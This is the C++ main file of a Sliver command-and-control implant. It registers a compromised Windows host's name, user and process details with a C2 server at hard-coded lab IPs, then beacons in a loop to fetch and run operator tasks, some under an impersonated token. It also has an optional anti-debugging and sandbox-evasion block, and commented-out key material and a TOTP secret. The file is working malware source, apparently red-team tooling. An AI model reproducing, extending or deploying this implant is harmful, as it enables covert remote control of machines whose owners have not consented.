// Sliver-CPPImplant.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
//#define _CRTDBG_MAP_ALLOC
#include <windows.h>
#include <stdlib.h>
#include <crtdbg.h>
#include <iostream>
#include "common.pb.h"
#include "sliver.pb.h"
#include "CryptoUtils.h"
#include "CipherContext.h"
#include "Token.h"
#include "Beacon.h"
#include "Os.h"
#include "pivots.h"
#include "constants.h"
#include "Handlers.h"
#define UUID_SYSTEM_GENERATOR
#include <stduuid/uuid.h>
#include "Connection.h"
#include "taskRunner.h"
#define MAX_CONNECTION_ERRORS 2
#pragma warning(disable:4996)

using namespace std;
using namespace transports;
using namespace uuids;

//typedef struct _ECCkeyPair {
//    BYTE pb_key[32];
//    BYTE pv_key[32];
//}ECCKeyPair,*PECCKeyPair;

//const int encodermodulus = 101;
//const int maxN = 999999;
//const int Base64EncoderID = 13;
//string eccServerPublicKey = "zKn2nDnphmQImAjQ+UmueLUdACvWBb02Voet943Huhc";
//// ECCPublicKey - The implant's ECC public key
//string eccPublicKey = "+UpkonzIDtgnuWkC8HXZkfb6xiXvgKWvbCA4Ii9kRjw";
//// eccPrivateKey - The implant's ECC private key
//string eccPrivateKey = "s+JQAl9lb2+Puj9B3k6PSaDMtbacUb0P5QZTGXhaTog";

//PECCKeyPair getKeyPair() {
//    unsigned char* out = new BYTE[crypto_box_SECRETKEYBYTES];
//    PECCKeyPair keyPair = new ECCKeyPair;
//    size_t lenRet;
//    if (sodium_base642bin(out, crypto_box_PUBLICKEYBYTES, eccPublicKey.c_str(), eccPublicKey.size(), NULL, &lenRet, NULL, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
//        memcpy(keyPair->pb_key, out, crypto_box_PUBLICKEYBYTES);
//    }
//    else {
//        delete out;
//        delete keyPair;
//        return NULL;
//    }
//    if (sodium_base642bin(out, crypto_box_SECRETKEYBYTES, eccPrivateKey.c_str(), eccPrivateKey.size(), NULL, &lenRet, NULL, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
//        memcpy(keyPair->pv_key, out, crypto_box_SECRETKEYBYTES);
//    }
//    else {
//        delete out;
//        delete keyPair;
//        return NULL;
//    }
//    delete out;
//    return keyPair;
//}
//
//PBYTE GetServerECCPublicKey() {
//    unsigned char* out = new unsigned char[crypto_box_PUBLICKEYBYTES];
//    size_t lenRet;
//    const char* b64end;
//    if (sodium_base642bin(out, 32, eccServerPublicKey.c_str(), eccServerPublicKey.size(), NULL, &lenRet, &b64end, sodium_base64_VARIANT_ORIGINAL_NO_PADDING) == 0) {
//        return out;
//    }
//    else {
//        delete out;
//        return NULL;
//    }
//}
//
//PBYTE generateKey() {
//    PBYTE buf = new BYTE[64];
//    randombytes_buf(buf,64);
//    unsigned char* out = new unsigned char[crypto_hash_sha256_BYTES];
//    crypto_hash_sha256(out, buf, 64);
//    delete buf;
//    return out;
//}
//void to_call() {
//    crypto::CipherContext ctx;
//    auto key = crypto::RandomKey();
//    auto server_pbk = crypto::GetServerECCPublicKey();
//    auto keyPair = crypto::getKeyPair();
//    ctx.SetKey(key);
//    sliverpb::HTTPSessionInit pb_req;
//    pb_req.set_key(key.c_str(), key.size());
//    string serialized;
//    pb_req.SerializeToString(&serialized);
//    auto encrypted = crypto::ECCEncryptToServer(serialized);
//
//}
extern string instanceID;

unique_ptr<sliverpb::Envelope> wrapEnvelope(uint32_t msgType,google::protobuf::Message& msg) {
    string data;
    msg.SerializeToString(&data);
    unique_ptr<sliverpb::Envelope> envelope = make_unique<sliverpb::Envelope>();
    envelope->set_type(msgType);
    envelope->set_data(data);
    return envelope;
}

sliverpb::Register* RegisterSliver() {
    sliverpb::Register* reg = new sliverpb::Register();
    token::UserInfo ui = token::GetCurrentUserInfo();
    auto hostname = os::GetHostName();
    auto executable = os::GetExecutableName();
    auto version = os::GetOSVersion();
    auto locale = os::GetUserDefaultLocaleNameString();
    string uuid = uuids::to_string(uuids::uuid_system_generator{}());  
    auto temp = instanceID;
    temp.resize(8);
    reg->set_name(temp);
    reg->set_hostname(hostname);
    reg->set_uuid(uuid);
    reg->set_username(ui.username);
    reg->set_uid(ui.uid);
    reg->set_gid(ui.gid);
    reg->set_os("windows");
    reg->set_version("10");
    reg->set_arch("amd64");
    reg->set_pid(static_cast<int32_t>(GetCurrentProcessId()));
    reg->set_filename(executable);
    reg->set_reconnectinterval(60 * 1000000000);
    reg->set_configid(string{ "23ce32cd-78ab-4d6a-8a38-fb2b06778f8f" });
    reg->set_peerid(pivots::generatePeerID());
    reg->set_locale(locale);
    return reg;
}

void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::system_clock, std::chrono::nanoseconds> nextcheckin) {
    sliverpb::BeaconTasks req_tasks;

    auto checkin = beacon->Duration().count();
    req_tasks.set_nextcheckin(checkin);
    req_tasks.set_id(instanceID);
    auto req = wrapEnvelope(sliverpb::MsgBeaconTasks, req_tasks);
    sliverpb::Envelope resp;
    if (!beacon->BeaconRecv(*(req.get()), resp) || resp.type()!=sliverpb::MsgBeaconTasks)
        return;
    sliverpb::BeaconTasks beaconTasks;
    beaconTasks.ParseFromString(resp.data());
    auto tasks = beaconTasks.tasks();
    sliverpb::BeaconTasks tasks_results;
    tasks_results.set_id(instanceID);

    if (tasks.size() != 0) {
        auto sysHandlers = handlers::getSystemHandlers();
        auto pivotHandlers = handlers::getBeaconPivotHandlers();
        vector<std::future<sliverpb::Envelope>> futures;
        for (auto it = tasks.begin();it != tasks.end();++it) {
            if (sysHandlers.contains(it->type())) {
                auto it_2 = sysHandlers.find(it->type());
                auto fut = std::async(
                    [](handlers::handler h, int64_t id, const std::string& data) {
                        auto htoken = token::getToken();
                        if (htoken != INVALID_HANDLE_VALUE) {
                            ImpersonateLoggedOnUser(token::getToken());
                        }
                        auto res = h(id, data);
                        if (htoken != INVALID_HANDLE_VALUE) {
                            RevertToSelf();
                        }
                        return res;
                    }, it_2->second, it->id(), it->data());
                tasks_results.mutable_tasks()->Add(fut.get());
            }
            if (pivotHandlers.contains(it->type())) {
                auto it_2 = pivotHandlers.find(it->type());
                auto env = it_2->second(*(it), beacon);
                tasks_results.mutable_tasks()->Add(std::move(env));
            }
            if (it->type() == sliverpb::MsgReconfigureReq) {
                sliverpb::ReconfigureReq req;
                req.ParseFromString(it->data());
                if (beacon->Reconfigure(req.beaconinterval(), req.beaconjitter(), req.reconnectinterval())) {
                    sliverpb::Reconfigure resp;
                    auto envelope = wrapEnvelope(sliverpb::MsgReconfigure, resp);
                    auto raw = envelope.release();
                    tasks_results.mutable_tasks()->Add(std::move(*raw));
                }
            }
        }
        auto envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, tasks_results);
        beacon->BeaconSend(*(envelope.get()));
    }
}

//void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::system_clock, std::chrono::nanoseconds> nextcheckin) {
//    sliverpb::BeaconTasks req;
//
//    auto checkin = beacon->Duration().count();
//    req.set_nextcheckin(checkin);
//    req.set_id(instanceID);
//    auto envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, req);
//    /*envelope = beacon->BeaconRecv();
//    if (envelope != nullptr && envelope->type() != sliverpb::MsgBeaconTasks) {
//        auto pivotHandlers = handlers::getBeaconPivotHandlers();
//        if (pivotHandlers.contains(envelope->type())) {
//            auto it_2 = pivotHandlers.find(envelope->type());
//            it_2->second(*(envelope.get()), beacon);
//        }
//    }
//    envelope = beacon->BeaconRecv();
//    if (envelope != nullptr && envelope->type() != sliverpb::MsgBeaconTasks) {
//        auto pivotHandlers = handlers::getBeaconPivotHandlers();
//        if (pivotHandlers.contains(envelope->type())) {
//            auto it_2 = pivotHandlers.find(envelope->type());
//            it_2->second(*(envelope.get()), beacon);
//        }
//    }
//    envelope = beacon->BeaconRecv();
//    if (envelope != nullptr && envelope->type() != sliverpb::MsgBeaconTasks) {
//        auto pivotHandlers = handlers::getBeaconPivotHandlers();
//        if (pivotHandlers.contains(envelope->type())) {
//            auto it_2 = pivotHandlers.find(envelope->type());
//            it_2->second(*(envelope.get()), beacon);
//        }
//    }
//    if (envelope != nullptr && envelope->type() == sliverpb::MsgBeaconTasks) {
//        sliverpb::BeaconTasks beaconTasks;
//        beaconTasks.ParseFromString(envelope->data());
//        auto tasks = beaconTasks.tasks();
//        sliverpb::BeaconTasks tasks_results;
//        tasks_results.set_id(instanceID);
//        if (tasks.size() != 0) {
//            auto sysHandlers = handlers::getSystemHandlers();
//            auto pivotHandlers = handlers::getBeaconPivotHandlers();
//            vector<std::future<sliverpb::Envelope>> futures;
//            for (auto it = tasks.begin();it != tasks.end();++it) {
//                if (sysHandlers.contains(it->type())) {
//                    auto it_2 = sysHandlers.find(it->type());
//                    auto fut = std::async(it_2->second, it->id(), it->data());
//                    tasks_results.mutable_tasks()->Add(fut.get());
//                }
//                if (pivotHandlers.contains(it->type())) {
//                    auto it_2 = pivotHandlers.find(it->type());
//                    it_2->second(*(envelope.get()), beacon);
//                }
//                if (it->type() == sliverpb::MsgReconfigureReq) {
//                    sliverpb::ReconfigureReq req;
//                    req.ParseFromString(it->data());
//                    if (beacon->Reconfigure(req.beaconinterval(), req.beaconjitter(), req.reconnectinterval())) {
//                        sliverpb::Reconfigure resp;
//                        auto envelope = wrapEnvelope(sliverpb::MsgReconfigure, resp);
//                        auto raw = envelope.release();
//                        tasks_results.mutable_tasks()->Add(std::move(*raw));
//                    }
//                }
//            }
//        }
//        auto pivotHandlers = handlers::getBeaconPivotHandlers();
//        if (pivotHandlers.contains(envelope->type())) {
//            auto it_2 = pivotHandlers.find(envelope->type());
//            it_2->second(*(envelope.get()), beacon);
//        }
//        auto envs = handlers::collectPivotEnvelopes();
//        for (auto it = envs.begin();it != envs.end();++it) {
//            beacon->BeaconSend(*it);
//        }
//        envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, tasks_results);
//        beacon->BeaconSend(*(envelope.get()));
//    }
//    envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, req);*/
//    /*if (!beacon->BeaconSend(*(envelope.get()))) {
//        return;
//    }*/
//    envelope = beacon->BeaconRecv();
//    if (envelope == nullptr) {
//        envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, req);
//        if (!beacon->BeaconSend(*(envelope.get()))) {
//            envelope = beacon->BeaconRecv();
//            if (envelope == nullptr) {
//                return;
//            }
//        }
//    }
//     if (envelope->type() == sliverpb::MsgBeaconTasks) {
//        sliverpb::BeaconTasks beaconTasks;
//        beaconTasks.ParseFromString(envelope->data());
//        auto tasks = beaconTasks.tasks();
//        sliverpb::BeaconTasks tasks_results;
//        tasks_results.set_id(instanceID);
//        if (tasks.size() != 0) {
//            auto sysHandlers = handlers::getSystemHandlers();
//            auto pivotHandlers = handlers::getBeaconPivotHandlers();
//            vector<std::future<sliverpb::Envelope>> futures;
//            for (auto it = tasks.begin();it != tasks.end();++it) {
//                if (sysHandlers.contains(it->type())) {
//                    auto it_2 = sysHandlers.find(it->type());
//                    auto fut = std::async(it_2->second, it->id(), it->data());
//                    tasks_results.mutable_tasks()->Add(fut.get());
//                }
//                if (pivotHandlers.contains(it->type())) {
//                    auto it_2 = pivotHandlers.find(it->type());
//                    it_2->second(*(it), beacon);
//                }
//                if (it->type() == sliverpb::MsgReconfigureReq) {
//                    sliverpb::ReconfigureReq req;
//                    req.ParseFromString(it->data());
//                    if (beacon->Reconfigure(req.beaconinterval(), req.beaconjitter(), req.reconnectinterval())) {
//                        sliverpb::Reconfigure resp;
//                        auto envelope = wrapEnvelope(sliverpb::MsgReconfigure, resp);
//                        auto raw = envelope.release();
//                        tasks_results.mutable_tasks()->Add(std::move(*raw));
//                    }
//                }
//            }
//        }
//        /*auto pivotHandlers = handlers::getBeaconPivotHandlers();
//        if (pivotHandlers.contains(envelope->type())) {
//            auto it_2 = pivotHandlers.find(envelope->type());
//            it_2->second(*(envelope.get()), beacon);
//        }*/
//        auto envs = handlers::collectPivotEnvelopes();
//        for (auto it = envs.begin();it != envs.end();++it) {
//            tasks_results.mutable_tasks()->Add(std::move(*it));
//        }
//        envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, tasks_results);
//        beacon->BeaconSend(*(envelope.get()));
//        
//        /*while (1) {
//            sliverpb::Envelope env;
//            if (!beacon->pivotEnvelope_queue->try_pop(env)) {
//                break;
//            }
//            else {
//                beacon->BeaconSend(env);
//            }
//        }*/
//    }
//}
void BeaconMainPivot(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::system_clock, std::chrono::nanoseconds> nextcheckin) {
    auto envelope = beacon->BeaconRecv();
    if (envelope == nullptr) {
        return;
    }
    sliverpb::BeaconTasks tasks_results;
    tasks_results.set_id(instanceID);
    auto sysHandlers = handlers::getSystemHandlers();
    auto pivotHandlers = handlers::getBeaconPivotHandlers();
    vector<std::future<sliverpb::Envelope>> futures;
    
    if (sysHandlers.contains(envelope->type())) {
        auto it_2 = sysHandlers.find(envelope->type());
        auto fut = std::async(it_2->second, envelope->id(), envelope->data());
        tasks_results.mutable_tasks()->Add(fut.get());
    }
    else if (pivotHandlers.contains(envelope->type())) {
        auto it_2 = pivotHandlers.find(envelope->type());
        it_2->second(*(envelope), beacon);
    }
    else if (envelope->type() == sliverpb::MsgReconfigureReq) {
        sliverpb::ReconfigureReq req;
        req.ParseFromString(envelope->data());
        if (beacon->Reconfigure(req.beaconinterval(), req.beaconjitter(), req.reconnectinterval())) {
            sliverpb::Reconfigure resp;
            auto envelope = wrapEnvelope(sliverpb::MsgReconfigure, resp);
            auto raw = envelope.release();
            tasks_results.mutable_tasks()->Add(std::move(*raw));
        }
    }
        
        /*auto pivotHandlers = handlers::getBeaconPivotHandlers();
        if (pivotHandlers.contains(envelope->type())) {
            auto it_2 = pivotHandlers.find(envelope->type());
            it_2->second(*(envelope.get()), beacon);
        }*/
    auto envs = handlers::collectPivotEnvelopes();
    for (auto it = envs.begin();it != envs.end();++it) {
        tasks_results.mutable_tasks()->Add(std::move(*it));
    }
    envelope = wrapEnvelope(sliverpb::MsgBeaconTasks, tasks_results);
    beacon->BeaconSend(*(envelope.get()));

        /*while (1) {
            sliverpb::Envelope env;
            if (!beacon->pivotEnvelope_queue->try_pop(env)) {
                break;
            }
            else {
                beacon->BeaconSend(env);
            }
        }*/
}
void BeaconMainLoopPivot(shared_ptr<Beacon> beacon) {
    if (!beacon->BeaconInit()) {
        cout << "Error beaconInit returned: false" << endl;
        return;
    }
    //auto nextCheckIn = std::chrono::system_clock::now() + std::chrono::nanoseconds(beacon->Duration());
    auto reg = RegisterSliver();
    reg->set_activec2(beacon->activeC2);
    reg->set_proxyurl(beacon->proxyURL);
    sliverpb::BeaconRegister br;
    br.set_allocated_register_(reg);
    br.set_id(instanceID);
    br.set_interval(beacon->interval.count());
    br.set_jitter(beacon->jitter.count());
    br.set_nextcheckin(beacon->Duration().count());
    auto envelope = wrapEnvelope(sliverpb::MsgBeaconRegister, br);
    beacon->BeaconSend(*(envelope.get()));
    while (1) {
        Sleep(std::chrono::duration_cast<std::chrono::milliseconds>
            (beacon->Duration()).count());
        auto duration = beacon->Duration();
        auto nextcheckin = std::chrono::system_clock::now() + duration;
        BeaconMainPivot(beacon, nextcheckin);
    }
}
void BeaconMainLoop(shared_ptr<Beacon> beacon) {
     if (!beacon->BeaconInit()) {
        cout << "Error beaconInit returned: false" << endl;
        return;
    }
    //auto nextCheckIn = std::chrono::system_clock::now() + std::chrono::nanoseconds(beacon->Duration());
    auto reg = RegisterSliver();
    reg->set_activec2(beacon->activeC2);
    reg->set_proxyurl(beacon->proxyURL);
    sliverpb::BeaconRegister br;
    br.set_allocated_register_(reg);
    br.set_id(instanceID);
    br.set_interval(beacon->interval.count());
    br.set_jitter(beacon->jitter.count());
    br.set_nextcheckin(beacon->Duration().count());
    auto envelope = wrapEnvelope(sliverpb::MsgBeaconRegister, br);
    beacon->BeaconSend(*(envelope.get()));
    while (1) {
        if (beacon->GetConnectionErrors() > MAX_CONNECTION_ERRORS) {
            beacon->SetConnectionErrors(0);
            return;
        }
        Sleep(std::chrono::duration_cast<std::chrono::milliseconds>
            (beacon->Duration()).count());
        auto duration = beacon->Duration();
        auto nextcheckin = std::chrono::system_clock::now() + duration;
        BeaconMain(beacon, nextcheckin);
    }
}

//void SessionMainLoop(shared_ptr<Connection> conn) {
//    conn->ConnectionInit();
//    auto reg = RegisterSliver();
//    reg->set_activec2(conn->activeC2);
//    reg->set_proxyurl(conn->proxyURL);
//    auto envelope = wrapEnvelope(sliverpb::MsgRegister, *reg);
//    conn->ConnectionSend(*(envelope.get()));
//    conn->ConnectionStart();
//    while (1) {
//        sliverpb::Envelope e;
//        if (!conn->recv_queue->try_pop(e)) {
//            continue;
//        }
//        auto sysHandlers = handlers::getSystemHandlers();
//        //auto pivotHandlers = handlers::getPivotHandlers();
//        if (sysHandlers.contains(e.type())) {
//            auto it_2 = sysHandlers.find(e.type());
//            auto fut = std::async(it_2->second, e.id(), e.data());
//            auto env = fut.get();
//            conn->to_send_queue->push(std::move(env));
//        }
//       /* if (pivotHandlers.contains(e.type())) {
//            auto it_2 = pivotHandlers.find(e.type());
//            auto fut = std::async(it_2->second, e,conn);
//            auto env = fut.get();
//            conn->to_send_queue->push(std::move(env));
//        }*/
//    }
//}
int main()
{
#ifdef ANTIDEBUG
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (pPEB->BeingDebugged) return;

    ULONGLONG uptimeBeforeSleep = GetTickCount64();
    typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * 100000; // 100 seconds
    pNtDelayExecution(FALSE, &delay);
    ULONGLONG uptimeAfterSleep = GetTickCount64();
    if ((uptimeAfterSleep - uptimeBeforeSleep) < 100000) return false;
#endif
#ifdef  PIVOT
    //instanceID = uuids::to_string(uuids::uuid_system_generator{}());
    //unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "192.168.161.30:9005" });
#else
    unique_ptr<IClient> cli = make_unique<HttpClient>(string{ "http://192.168.161.50" }, 10, 10, 10);
#endif
    //  PIVOT
   
   instanceID = uuids::to_string(uuids::uuid_system_generator{}());
   shared_ptr<Beacon> beacon = make_shared<Beacon>("http://192.168.161.50",cli);
   while (1) {
       BeaconMainLoop(beacon);

       Sleep(std::chrono::duration_cast<std::chrono::milliseconds>(
           beacon->GetReconnectInterval()).count());
   }
   /*instanceID = uuids::to_string(uuids::uuid_system_generator{}());
   shared_ptr<Connection> connection = make_shared<Connection>("http://192.168.161.50", cli);
   while (1) {
       SessionMainLoop(connection);
   }*/
   // to_call();
   //
   // _CrtDumpMemoryLeaks();
   // sliverpb::Response res;
   //   
   // std::cout << "Hello World!\n";
   // 
   // sliverpb::Register req_2;
   // sliverpb::HTTPSessionInit sess_init;

   // sliverpb::Envelope* env = new sliverpb::Envelope();

   // sliverpb::BeaconRegister b_reg;


   // PBYTE key = generateKey();
   // PBYTE server_pbk = GetServerECCPublicKey();
   // PECCKeyPair keyPair = getKeyPair();
   // printf("key: \n");
   // for (int i = 0;i < crypto_hash_sha256_BYTES;i++) {
   //     printf("key[%d] = %d\n", i, key[i]);
   // }
   //// auto k = new basic_string((char *)key, crypto_hash_sha256_BYTES);
   // sess_init.set_key(key, crypto_hash_sha256_BYTES);
   // 
   // PBYTE serialized = new BYTE[sess_init.ByteSizeLong()];
   // sess_init.SerializeToArray(serialized, sess_init.ByteSizeLong());
   // PBYTE encrypted = new BYTE[crypto_box_MACBYTES  + sess_init.ByteSizeLong()];

   // PBYTE nonce = new BYTE[crypto_box_NONCEBYTES];
   // randombytes_buf(nonce, crypto_box_NONCEBYTES);
   // crypto_box_easy(encrypted, serialized, sess_init.ByteSizeLong(), nonce, server_pbk, keyPair->pv_key);
   // //crypto_box_seal(encrypted, serialized, sess_init.ByteSizeLong(), server_pbk);
   // unsigned char digest[crypto_hash_sha256_BYTES];
   // crypto_hash_sha256(digest, keyPair->pb_key, crypto_box_PUBLICKEYBYTES);
   // PBYTE encSessionInit = new BYTE[crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong()];
   // memcpy(&encSessionInit[0], digest, crypto_hash_sha256_BYTES);
   // memcpy(&encSessionInit[crypto_hash_sha256_BYTES], nonce, crypto_box_NONCEBYTES);
   // memcpy(&encSessionInit[crypto_hash_sha256_BYTES+ crypto_box_NONCEBYTES], encrypted, crypto_box_MACBYTES + sess_init.ByteSizeLong());
   // /*
   // printf("encSessionInit:\n");
   // for (int i = 0;i < crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong();i++) {
   //     printf("%d\n", encSessionInit[i]);
   // }*/
   // //char *body = new char[sodium_base64_ENCODED_LEN(32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(), sodium_base64_VARIANT_ORIGINAL_NO_PADDING)];
   //
   // auto enc = base64::to_base64(std::string((char *)&encSessionInit[0], crypto_hash_sha256_BYTES + crypto_box_NONCEBYTES + crypto_box_MACBYTES + sess_init.ByteSizeLong()));
   // 
   // char ch = '=';

   // enc.erase(remove(enc.begin(), enc.end(), ch), enc.end());


   // /*sodium_bin2base64(body, sodium_base64_ENCODED_LEN(32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(), sodium_base64_VARIANT_ORIGINAL_NO_PADDING)
   //     , encSessionInit,
   //     32 + crypto_box_MACBYTES + sess_init.ByteSizeLong(),
   //     sodium_base64_VARIANT_ORIGINAL_NO_PADDING);*/

   // string totpsecret = "TZLMFPN6HDMZGIVSDSP7UNQNG3BNCO3Y";

   // auto vec = Botan::base32_decode(totpsecret);
   // 
   // auto totp_key = vec.data();
   // 
   // auto a = Botan::TOTP(totp_key,vec.size(),"SHA-256", 8, 30);
   // auto t = std::time(nullptr);
   // char* end;
   // auto timestamp=strtoull(asctime(localtime(&t)),&end,10);

   // auto tp = std::chrono::system_clock::now();
   // 
   // auto totp = a.generate_totp(tp);
   // 
   // auto uri = string("http://192.168.161.50/authenticate/rpc.html");
   // std::stringstream ss;

   // int nonce_2 = rand() * encodermodulus + Base64EncoderID;

   // uri = uri + string("?n=") + to_string(nonce_2) + string("&op=") + to_string(totp);

    //req.setOpt<curlpp::options::Url>(uri); 
    //req.setOpt(curlpp::options::PostFields(enc.c_str()));
    ////req.setOpt(cURLpp::Options::WriteStream(&ss));    
    //req.perform();
    //httplib::Client cli("192.168.161.50", 80);
    //cli.set_connection_timeout(0, 300000); // 300 milliseconds
    //cli.set_read_timeout(50, 0); // 5 seconds
    //cli.set_write_timeout(50, 0); // 5 seconds
    //auto path = string("/authenticate/rpc.html") + string("?n=") + to_string(nonce_2) + string("&op=") + to_string(totp);
    //auto resp = cli.Post(path, enc, "application/x-www-form-urlencoded");

    //auto respval = resp.value();

    //auto now = std::chrono::system_clock::now();
    //auto serverDateHeader = respval.get_header_value("Date");
    //if (respval.status != 200) {
    //    auto now = std::chrono::system_clock::now();
    //    auto serverDateHeader = respval.get_header_value("Date");
    //    //std::chrono::system_clock()
    //}
    //auto decoded = base64::from_base64(respval.body);
    //
    //PBYTE decoded_bytes = (PBYTE)decoded.c_str();
    //const int decoded_len = decoded.size();
    //
    //PBYTE nonce_3 = decoded_bytes;
    //PBYTE encrypted_2 = &decoded_bytes[crypto_aead_chacha20poly1305_IETF_NPUBBYTES];
    //PBYTE decrypted = new BYTE[decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES - crypto_aead_chacha20poly1305_IETF_ABYTES];
    //unsigned long long decrypted_len = 0;
    //if (!crypto_aead_chacha20poly1305_ietf_decrypt(decrypted, &decrypted_len, NULL, encrypted_2, decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES, NULL, 0, nonce_3, key)) {
    //    printf("success");
    //}
    //std::string decompressed_data = gzip::decompress((const char *)decrypted, decoded_len - crypto_aead_chacha20poly1305_IETF_NPUBBYTES - crypto_aead_chacha20poly1305_IETF_ABYTES);
    //
}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
